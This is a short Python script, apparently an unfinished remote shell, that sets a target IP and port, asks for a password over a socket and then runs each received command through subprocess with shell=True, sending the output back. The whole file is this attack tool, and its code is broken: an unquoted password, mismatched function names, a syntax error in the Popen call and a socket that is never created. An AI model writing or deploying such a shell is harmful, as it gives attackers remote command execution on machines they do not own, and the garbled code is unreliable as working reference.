#! /usr/bin/python

import subprocess
import socket

host = "10.192.6.9"
passwd = aoeu
port = 123

def login():
    global s
    s.send("login: ")
    pwd = s.recv(1024)
    if pwd.strip() !=passwd:
        Login()
    else:
        s.send("Connected #> ")
        Shell()


def Shell():
    while True:
        data = s.recv(1024)
        if data.strip() == ' :kill':
            break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin-subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send(" #> ")

